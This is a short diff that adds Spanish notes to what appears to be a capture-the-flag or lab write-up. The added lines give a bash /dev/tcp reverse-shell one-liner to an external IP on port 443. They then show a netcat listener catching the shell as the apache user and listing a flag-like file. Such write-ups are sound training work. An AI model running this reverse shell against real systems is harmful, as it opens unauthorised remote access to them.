@@ -159,3 +159,21 @@ root        1627  0.0  0.5 121120 22392 ?        S    04:43   0:02 python3 -m we
 
 
 redirige el puerto 80 a un puerto VNC interno 5901
+
+
+ahora abrire una reverse shell 
+
+Shell> bash -c 'exec bash -i >& /dev/tcp/192.168.138.111/443 0>&1'
+
+
+[davidoberst@archlinux ~]$ nc -lvnp 443 
+nc: Permission denied
+[davidoberst@archlinux ~]$ sudo nc -lvnp 443 
+[sudo] password for davidoberst: 
+Listening on 0.0.0.0 443
+Connection received on 10.67.180.97 33394
+bash: cannot set terminal process group (1354): Inappropriate ioctl for device
+bash: no job control in this shell
+apache@ip-10-67-180-97:/data/www/default$ ls
+ls
+650c844110baced87e1606453b93f22a.txt
